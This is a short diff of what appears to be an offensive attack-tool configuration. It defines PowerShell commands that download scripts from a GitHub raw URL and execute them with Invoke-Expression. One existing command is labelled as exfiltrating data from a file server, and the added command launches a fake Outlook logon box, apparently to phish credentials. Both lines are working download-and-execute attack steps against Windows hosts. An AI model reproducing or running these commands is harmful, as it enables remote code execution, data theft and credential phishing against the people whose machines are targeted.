@@ -39,4 +39,7 @@ set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubu
 #Exfil Data - File Server
 set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/f.txt; Invoke-Expression $($script.content); $script -eq $null; }""'
 
+#Launch Outlook Logon Box
+set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/o.txt; Invoke-Expression $($script.content); $script -eq $null; }""'
+
 
